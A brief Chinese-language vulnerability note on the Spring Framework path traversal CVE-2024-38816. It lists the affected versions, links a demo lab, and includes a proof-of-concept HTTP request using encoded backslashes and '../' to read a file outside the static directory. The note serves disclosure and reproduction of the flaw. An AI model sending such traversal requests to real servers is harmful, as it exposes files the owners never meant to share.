# Spring-Framework路径遍历漏洞(CVE-2024-38816)

Spring Framework受影响版本中，使用WebMvc.fn 或 WebFlux.fn（在Spring Web MVC或Spring WebFlux框架中）提供静态资源的应用程序容易受到路径遍历攻击，当Web 应用程序使用RouterFunctions提供静态资源并且应用程序使用FileSystemResource或类似的配置来从文件系统提供静态文件时，威胁者可构造恶意HTTP请求访问目标文件系统上Spring 应用程序进程有权访问的任意文件，从而导致数据泄露。

## 影响范围

Spring Framework 5.3.0 - 5.3.39

Spring Framework 6.0.0 - 6.0.23

Spring Framework 6.1.0 - 6.1.12

## 漏洞环境

https://github.com/weliveby/cve-2024-38816-demo

## poc

```javascript
GET /static/%5c/%5c/../../v.txt HTTP/1.1
Host: 127.0.0.1:8087
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![image-20240929095330475](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409290953532.png)

![image-20240929095436847](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409290954898.png)